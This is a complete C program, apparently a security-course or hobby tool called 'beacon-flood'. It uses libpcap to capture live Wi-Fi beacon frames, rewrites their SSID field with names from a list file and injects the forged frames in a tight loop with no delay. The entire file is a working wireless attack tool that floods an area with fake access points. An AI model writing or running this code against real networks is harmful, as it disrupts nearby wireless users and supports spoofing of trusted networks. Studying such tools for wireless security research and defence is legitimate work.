#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ESSID_MAX_LEN 100
#define FIXED_PARAMETERS_LEN 12

struct ieee80211_radiotap_header {
    u_int8_t it_version;
    u_int8_t it_pad;
    u_int16_t it_len;
    u_int32_t it_present;
} __attribute__((__packed__));

struct BEACON_FRAME {
    u_int8_t frame_type[2];
    u_int16_t duration_id;
    u_int8_t destination_mac[6];
    u_int8_t source_mac[6];
    u_int8_t bssid[6];
    u_int16_t sequence_ctr;
} __attribute__((__packed__));

typedef struct {
    char ssid[ESSID_MAX_LEN];
} SSID;

SSID ssid_list[256];
int ssid_count = 0;
char* dev;

void usage() {
    printf("syntax: beacon-flood <interface> <ssid-list-file>\n");
    printf("sample: beacon-flood mon0 ssid-list.txt\n");
    exit(1);
}

void load_ssid_list(const char* filename) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        perror("Failed to open ssid-list file");
        exit(1);
    }

    while (fgets(ssid_list[ssid_count].ssid, sizeof(ssid_list[ssid_count].ssid), file)) {
        ssid_list[ssid_count].ssid[strcspn(ssid_list[ssid_count].ssid, "\n")] = 0; // Remove newline
        ssid_count++;
        if (ssid_count >= 256) {
            fprintf(stderr, "SSID list exceeds maximum capacity (256).\n");
            break;
        }
    }
    fclose(file);

    if (ssid_count == 0) {
        fprintf(stderr, "SSID list is empty.\n");
        exit(1);
    }
}

void capture_and_send_beacon_frames(pcap_t* handle) {
    struct pcap_pkthdr* header;
    const u_char* original_packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &original_packet)) >= 0) {
        if (res == 0) continue;

        // Copy the original packet to modify
        u_char packet[header->caplen];
        memcpy(packet, original_packet, header->caplen);

        // Parse Radiotap Header and Beacon Frame
        struct ieee80211_radiotap_header* radiotap = (struct ieee80211_radiotap_header*)packet;
        struct BEACON_FRAME* beacon = (struct BEACON_FRAME*)(packet + radiotap->it_len);

        // Check if it's a Beacon Frame
        if (beacon->frame_type[0] != 0x80) // Not a Beacon Frame
            continue;

        // Locate the SSID tag
        int idx = radiotap->it_len + sizeof(struct BEACON_FRAME) + FIXED_PARAMETERS_LEN; // Skip Fixed Parameters
        while ((unsigned int)idx < header->caplen) {
            if (packet[idx] == 0x00) { // Tag Number: SSID
                int original_ssid_len = packet[idx + 1]; // Original SSID Length
                for (int i = 0; i < ssid_count; i++) {
                    int new_ssid_len = strlen(ssid_list[i].ssid);

                    // Calculate new packet length
                    int new_packet_len = header->caplen - original_ssid_len + new_ssid_len;

                    // Allocate new packet
                    u_char* new_packet = (u_char*)malloc(new_packet_len);
                    if (!new_packet) {
                        fprintf(stderr, "Memory allocation failed.\n");
                        exit(1);
                    }

                    // Copy data before SSID
                    int ssid_offset = idx + 2;
                    memcpy(new_packet, packet, ssid_offset);

                    // Insert new SSID
                    memcpy(new_packet + ssid_offset, ssid_list[i].ssid, new_ssid_len);

                    // Copy data after SSID
                    memcpy(new_packet + ssid_offset + new_ssid_len, packet + ssid_offset + original_ssid_len, header->caplen - ssid_offset - original_ssid_len);

                    // Update SSID length
                    new_packet[idx + 1] = new_ssid_len;

                    // Send the modified packet
                    if (pcap_sendpacket(handle, new_packet, new_packet_len) != 0) {
                        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
                    } else {
                        printf("Sent beacon with SSID: %s\n", ssid_list[i].ssid);
                    }

                    free(new_packet);

//                    usleep(100000); // 100ms delay
                }
                break;
            }
            idx += packet[idx + 1] + 2; // Move to the next tag
        }
    }

    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        fprintf(stderr, "Error reading packet: %s\n", pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        usage();
    }

    dev = argv[1];
    const char* ssid_file = argv[2];

    // Load SSID list
    load_ssid_list(ssid_file);

    // Open live pcap handle for capturing and sending packets
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return 1;
    }

    // Capture and modify beacon frames
    capture_and_send_beacon_frames(handle);

    pcap_close(handle);
    return 0;
}
	
